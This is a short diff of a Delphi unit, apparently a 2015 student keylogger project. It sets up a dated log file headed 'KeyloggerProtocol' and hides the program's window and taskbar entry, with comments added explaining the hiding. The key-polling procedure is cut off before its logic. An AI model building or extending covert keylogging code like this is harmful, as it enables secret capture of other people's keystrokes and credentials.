@@ -5,7 +5,7 @@ unit Unit1;
    Authors: Timothy Schiess, Florian Huwyler, Alain Stulz
    Date: 19.02.2015 - 26.02.2015
 }
-   //TODO: Merge with Florian
+
 interface
 
 uses
@@ -46,7 +46,7 @@ begin
   Memo2.SetFocus;
 end;
 
-procedure TForm1.FormCreate(Sender: TObject);
+procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
 var f:textfile;
 begin
 d:= datetostr(now) + '.txt';
@@ -54,11 +54,11 @@ assignfile(f,d);
 rewrite(f);
 writeln(f, 'KeyloggerProtocol - EF Info');
 closefile(f);
-Application.ShowMainForm := False;
-Application.MainFormOnTaskbar := True;
+Application.ShowMainForm := False;   //Hides Form
+Application.MainFormOnTaskbar := false; //Hides Label on the bottom taskbar
 end;
 
-procedure TForm1.Timer1Timer(Sender: TObject);
+procedure TForm1.Timer1Timer(Sender: TObject); //Main Procedure based of an interval
 var
 InputKey, KeyResult : Integer;
 Pressed: Bool;
